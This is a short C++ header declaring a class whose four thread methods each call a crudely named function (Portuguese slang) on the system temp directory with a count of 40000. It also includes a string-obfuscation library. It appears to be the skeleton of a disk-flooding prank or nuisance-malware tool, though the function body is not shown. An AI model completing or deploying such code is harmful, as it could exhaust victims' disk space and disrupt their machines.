#include <iostream>
#include <fstream>
#include <filesystem>
#include <thread>
#include <chrono>
#include <xorstr.hpp>

namespace fs = std::filesystem;

namespace overweight
{
	class c_ow
	{
	public:
		auto __stdcall encherocudelinguica(const std::string& dir, int quantidade) -> void;
		auto __stdcall startthread1() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
		auto __stdcall startthread2() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
		auto __stdcall startthread3() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
		auto __stdcall startthread4() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
	};
}
